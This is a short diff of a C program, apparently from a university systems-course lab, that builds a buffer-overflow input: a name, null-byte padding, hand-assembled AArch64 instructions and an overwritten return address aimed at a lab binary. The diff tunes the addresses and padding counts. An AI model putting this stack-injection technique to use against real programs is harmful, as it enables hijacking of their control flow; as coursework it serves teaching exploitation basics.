@@ -13,7 +13,7 @@
 #include <stdlib.h>
 #include "miniassembler.h"
 
-static const unsigned int lReturnAddress = 0x420076;
+static const unsigned int lReturnAddress = 0x420078;
 static const char sName[] = "Chinmay Bhandaru";
 
 
@@ -31,15 +31,17 @@ int main(void) {
     fprintf(psFile, sName);
 
     /* Add nullbytes to overrun the buffer and mark end of name */
-    for (i = 0; i < 14; i++) {
+    for (i = 0; i < 4; i++) {
         putc(0, psFile);
     }
+
+    /* Add nullbytes to overrun the buffer and mark end of name */
 
     uiInstr = MiniAssembler_mov(0, 'A');
 
     fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
 
-    uiInstr = MiniAssembler_adr(1, 0x420000 + 68,0x420080);
+    uiInstr = MiniAssembler_adr(1, 0x420000 + 68,0x420082);
 
     fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
 
@@ -47,12 +49,12 @@ int main(void) {
 
     fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
 
-    uiInstr = MiniAssembler_b(0x40089c, 0x420088);
+    uiInstr = MiniAssembler_b(0x40089c, 0x420090);
 
     fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
 
     /* Add nullbytes to overrun the buffer and mark end of name */
-    for (i = 30; i < 32; i++) {
+    for (i = 0; i < 12; i++) {
         putc(0, psFile);
     }
 
